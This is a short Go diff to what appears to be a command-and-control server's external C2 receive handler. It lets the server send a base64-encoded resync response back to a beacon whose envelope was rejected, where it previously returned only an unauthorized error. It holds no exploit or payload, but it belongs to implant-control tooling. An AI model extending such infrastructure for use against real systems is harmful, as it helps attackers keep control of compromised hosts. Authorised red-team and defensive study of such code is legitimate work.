@@ -89,6 +89,19 @@ func (s *Server) handleExtC2Receive(c *gin.Context) {
 	// identity comes from the authenticated envelope and cannot be spoofed.
 	env, br, kind := s.decodeBeaconEnvelope(raw)
 	if kind == frameRejected {
+		// Resync rides the normal base64 data channel back to the beacon.
+		if body, ok := s.resyncResponseFor(env); ok {
+			respJSON, err := json.Marshal(struct {
+				Success bool   `json:"success"`
+				Data    string `json:"data"`
+			}{Success: true, Data: base64.StdEncoding.EncodeToString(body)})
+			if err != nil {
+				c.JSON(http.StatusInternalServerError, extC2ReceiveResponse{Error: sanitizeError(err, "Response encoding")})
+				return
+			}
+			c.Data(http.StatusOK, "application/json", respJSON)
+			return
+		}
 		c.JSON(http.StatusUnauthorized, extC2ReceiveResponse{Error: "invalid beacon envelope"})
 		return
 	}
